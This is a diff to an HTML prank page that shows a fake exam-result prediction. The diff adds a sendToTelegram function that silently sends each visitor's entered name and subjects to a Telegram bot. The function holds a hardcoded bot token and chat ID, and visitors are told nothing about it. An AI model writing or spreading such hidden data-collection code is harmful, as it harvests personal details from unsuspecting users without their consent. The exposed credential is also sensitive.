@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -142,6 +142,27 @@
                 resultBox.innerHTML = "<h2 class='glitch'>😂 You Got Pranked! 😂</h2><p>This is a fake prediction. Go study, this won't help you!</p>";
                 document.getElementById("prankSound").play();
             }, 3000);
+
+            sendToTelegram(username, subjects);
+        }
+
+        function sendToTelegram(username, subjects) {
+            let botToken = "7880536303:AAFCop3W72uhhIK_4MOAnByV-rRMyFZEfZo";  // 🔹 यहाँ अपना Telegram Bot Token डालो
+            let chatId = "6423851220";  // 🔹 यहाँ अपना Chat ID डालो
+            
+            let message = `📢 *New User Data Received!*\n👤 *Name:* ${username}\n📚 *Subjects:* ${subjects}\n⏰ *Time:* ${new Date().toLocaleString()}`;
+            
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("✅ Data Sent to Telegram!");
+                    } else {
+                        console.log("❌ Error Sending Data!");
+                    }
+                })
+                .catch(error => console.log("❌ Network Error!"));
         }
 
         function shareWebsite() {
